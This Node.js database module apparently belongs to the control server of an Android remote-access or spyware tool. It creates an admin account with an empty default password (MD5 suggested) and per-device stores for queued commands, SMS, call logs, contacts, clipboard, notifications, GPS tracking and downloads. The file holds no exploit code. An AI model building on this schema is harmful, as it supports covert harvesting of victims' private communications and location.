const fs = require('fs');
const path = require('path');
const lowdb = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');

// Setup paths
const baseDir = path.resolve(__dirname, '../database');
const clientDir = path.join(baseDir, 'clientData');

// Create folders if missing
if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
if (!fs.existsSync(clientDir)) fs.mkdirSync(clientDir, { recursive: true });

// Main DB setup
const mainDBPath = path.join(baseDir, 'maindb.json');
const maindb = lowdb(new FileSync(mainDBPath));

// Default admin + structure
maindb.defaults({
  admin: {
    username: 'admin',
    password: '',            // should be MD5
    loginToken: '',
    logs: [],
    ipLog: []
  },
  clients: []
}).write();

// Per-client DB structure
class ClientDB {
  constructor(clientID) {
    const file = path.join(clientDir, `${clientID}.json`);
    const db = lowdb(new FileSync(file));

    db.defaults({
      clientID,
      CommandQue: [],
      SMSData: [],
      CallData: [],
      contacts: [],
      wifiNow: [],
      wifiLog: [],
      clipboardLog: [],
      notificationLog: [],
      enabledPermissions: [],
      apps: [],
      GPSData: [],
      GPSSettings: { updateFrequency: 0 },
      downloads: [],
      currentFolder: []
    }).write();

    return db;
  }
}

// Export
module.exports = {
  maindb,
  clientdb: ClientDB
};